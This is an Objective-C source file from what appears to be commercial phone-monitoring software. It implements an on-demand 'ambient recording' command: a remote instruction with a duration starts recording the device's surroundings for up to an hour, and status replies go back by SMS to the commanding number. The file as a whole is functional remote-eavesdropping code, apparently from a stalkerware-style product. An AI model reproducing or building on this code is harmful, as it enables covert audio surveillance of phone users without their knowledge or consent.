/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  OnDemandRecordProcessor
 - Version      :  1.0  
 - Purpose      :  Record audio
 - Copy right   :  29/11/2012, Benjawan Tanarattanakorn, Vervata Co., Ltd. All rights reserved.
 */
#import "OnDemandRecordProcessor.h"
#import "AmbientRecordingManagerImpl.h"
#import "AmbientRecordingContants.h"


@interface OnDemandRecordProcessor (private)
- (void) processOnDemandRecord;
- (void) onDemandRecordFailToStartException;
- (void) onDemandRecordFailCallInProgressException;
- (void) onDemandRecordInvalidFormatException;
- (void) acknowldgeMessage;
- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete; 
- (BOOL) isValidFlag;
- (void) processFinished;
- (void) recordingCompleted: (NSError *) aError;
- (void) biggerDuration;
- (void) smallerDuration;
@end


@implementation OnDemandRecordProcessor

/**
 - Method name:			initWithRemoteCommandData:andCommandProcessingDelegate
 - Purpose:				This method is used to initialize the OnDemandRecordProcessor class
 - Argument list and description:	aRemoteCmdData (RemoteCmdData), aRemoteCmdProcessingDelegate (RemoteCmdProcessingDelegate)
 - Return description:	No return type
 */
- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData 
	andCommandProcessingDelegate: (id <RemoteCmdProcessingDelegate>) aRemoteCmdProcessingDelegate {
	
	DLog (@">>>>>>>> OnDemandRecordProcessor--->initWithRemoteCommandData")
	
	if ((self = [super initWithRemoteCommandData:aRemoteCmdData andCommandProcessingDelegate:aRemoteCmdProcessingDelegate])) {
	}
	return self;
}


#pragma mark Overriden method


/**
 - Method name:			doProcessingCommand
 - Purpose:				This method is used to process the OnDemandRecordProcessor
 - Argument list and description:	No Argument 
 - Return description:	No return type
 - Overided				RemoteCmdProcessor protocol
 */
- (void) doProcessingCommand {
	DLog (@"OnDemandRecordProcessor--->doProcessingCommand")
	if ([self isValidFlag]) {
		[self processOnDemandRecord];
	} else {
		[self onDemandRecordInvalidFormatException];
	}


}


#pragma mark Private method


/**
 - Method name:			processRequestRunningApplication
 - Purpose:				This method is used to process On Demand Record
 - Argument list and description:	No Argument
 - Return description:	No return type
 */
- (void) processOnDemandRecord {
	DLog (@"OnDemandRecordProcessor ---> processOnDemandRecord");
	id <AmbientRecordingManager> ambientRecordingManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mAmbientRecordingManager];

	NSInteger durationInMin = [[[mRemoteCmdData mArguments] objectAtIndex:2] intValue];
	DLog (@"durationInMin %d", durationInMin)
	
	if (durationInMin < 1) {
		[self performSelector:@selector(smallerDuration) withObject:nil afterDelay:0.1];
	} else {
		StartAmbientRecorderErrorCode code = [ambientRecordingManager startRecord:MIN(durationInMin, 60)
														 ambientRecordingDelegate:self];
		/*
		 kStartAmbientRecordingOK							= 0, 
		 kStartAmbientRecordingIsRecording					= 1,	--> recording is in progress
		 kStartAmbientRecordingAudioHWIsNotAvailable		= 2,    
		 kStartAmbientRecordingRecordingIsNotAllowed		= 3,    --> the possible reason is that the call is in progress
		 kStartAmbientRecordingOutputPathIsNotSpecified		= 4
		 */
		if (code != kStartAmbientRecordingOK) {
			DLog (@"!!! not ready to process Ambient Record");
			[self onDemandRecordFailToStartException];
		}
		else {
			DLog (@".... processing Ambient Record command");
			if (durationInMin > 60) {
				[self performSelector:@selector(biggerDuration) withObject:nil afterDelay:0.1];
			} else {
				[self acknowldgeMessage];
			}
		}
	}
}

/**
 - Method name:			onDemandRecordFailToStartException
 - Purpose:				This method is invoked when it fails to start on demand record
 - Argument list and description:	No Return Type
 - Return description:	No Argument
 */
- (void) onDemandRecordFailToStartException {
	DLog (@"OnDemandRecordProcessor ---> onDemandRecordFailToStartException");
	FxException* exception = [FxException exceptionWithName:@"onDemandRecordException" andReason:@"On demand record fails to start"];
	[exception setErrorCode:kOnDemandRecordFailToStart];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}
			 
/**
- Method name:			onDemandRecordFailCallInProgressException
- Purpose:				This method is invoked when it fails to start on demand record because of call is in progress
- Argument list and description:	No Return Type
- Return description:	No Argument
*/
- (void) onDemandRecordFailCallInProgressException {
	 DLog (@"OnDemandRecordProcessor ---> onDemandRecordFailCallInProgressException");
	 FxException* exception = [FxException exceptionWithName:@"onDemandRecordException" andReason:@"On demand record fails, call in progress"];
	 [exception setErrorCode:kOnDemandRecordCallInProgress];
	 [exception setErrorCategory:kFxErrorRCM]; 
	 @throw exception;
}

/**
 - Method name:			onDemandRecordInvalidFormatException
 - Purpose:				This method is invoked when the command format is invalid
 - Argument list and description:	No Return Type
 - Return description:	No Argument
 */
- (void) onDemandRecordInvalidFormatException {
	DLog (@"OnDemandRecordProcessor ---> onDemandRecordInvalidFormatException");
	FxException* exception = [FxException exceptionWithName:@"onDemandRecordException" andReason:@"On demand record invalid format"];
	[exception setErrorCode:kCmdExceptionErrorInvalidCmdFormat];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/**
 - Method name:			acknowldgeMessage
 - Purpose:				This method is used to prepare acknowldge message
 - Argument list and description:	No Argument 
 - Return description:	No Return
 */
- (void) acknowldgeMessage {
	DLog (@"OnDemandRecordProcessor ---> acknowldgeMessage");
	NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						  andErrorCode:_SUCCESS_];
	NSString *ackMessage = [messageFormat stringByAppendingString:NSLocalizedString(@"kOnDemandRecordMSG1", @"")];
	DLog (@"ackMessage %@" , ackMessage)
	[self sendReplySMS:ackMessage isProcessCompleted:NO];
}

/**
 - Method name:			sendReplySMS:isProcessCompleted:
 - Purpose:				This method is used to send the SMS reply
 - Argument list and description:	aStatusCode (NSUInteger)
 - Return description:	No return type
 */
- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete  {
	DLog (@"OnDemandRecordProcessor ---> sendReplySMS...")
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:aReplyMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
	    [[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:aReplyMessage];
	}
	if (aIsComplete) {
		[self processFinished];
	} else {
		DLog (@"Sent aknowldge message.")
	}
}

- (BOOL) isValidFlag {
	BOOL isFlag = NO;
	NSArray *args = [mRemoteCmdData mArguments];
	//DLog (@"argument count: %d", [args count])
	if ([args count] >= 3) {
		NSArray *durationArray = [[NSArray alloc] initWithArray:[RemoteCmdProcessorUtils validateArgs:[mRemoteCmdData mArguments] 
																					   validationType:kDigitValidation]];
		if ([durationArray count] > 0) 
			isFlag = YES;	
		[durationArray release];
	}
	return (isFlag);
}

/**
 - Method name:			processFinished
 - Purpose:				This method is invoked when on demand record process is completed
 - Argument list and description:	No Argument 
 - Return description:	isValidArguments (BOOL)
 */
-(void) processFinished {
	DLog (@"OnDemandRecordProcessor ---> processFinished")
	if ([mRemoteCmdProcessingDelegate respondsToSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:)]) {
		[mRemoteCmdProcessingDelegate performSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:) withObject:self withObject:mRemoteCmdData];
	}
}

// protocol AmbientRecordingDelegate
- (void) recordingCompleted: (NSError *) aError {
	DLog (@"!!!!!!! OnDemandRecordProcessor ---> recordingCompleted %@", aError)

	NSInteger errorCode = [aError code];		// kAmbientRecordingOK or kAmbientRecordingEndByInterruption
							   
	if (errorCode == kAmbientRecordingOK || 
		errorCode == kAmbientRecordingEndByInterruption) {		// interrupted by call in/out	
		DLog (@"complete")
		NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																							  andErrorCode:_SUCCESS_];
		messageFormat = [messageFormat stringByAppendingString:NSLocalizedString(@"kOnDemandRecordMSG2", @"")];
		[self sendReplySMS:messageFormat isProcessCompleted:YES];
	} else {									// kAmbientRecordingAudioEncodeError or kAmbientRecordingThumbnailCreationError
		DLog (@"fail")
		NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																							  andErrorCode:kOnDemandRecordNotComplete];
		[self sendReplySMS:messageFormat isProcessCompleted:YES];
	}
}

- (void) biggerDuration {
	NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						  andErrorCode:_SUCCESS_];
	messageFormat = [messageFormat stringByAppendingString:NSLocalizedString(@"kOnDemandRecordSuccessMSG1", @"")];
	[self sendReplySMS:messageFormat isProcessCompleted:NO];
}

- (void) smallerDuration {
	NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						  andErrorCode:_ERROR_];
	messageFormat = [messageFormat stringByAppendingString:NSLocalizedString(@"kOnDemandRecordErrorMSG1", @"")];
	[self sendReplySMS:messageFormat isProcessCompleted:YES];
}

- (void) dealloc {	
	[super dealloc];
}

@end
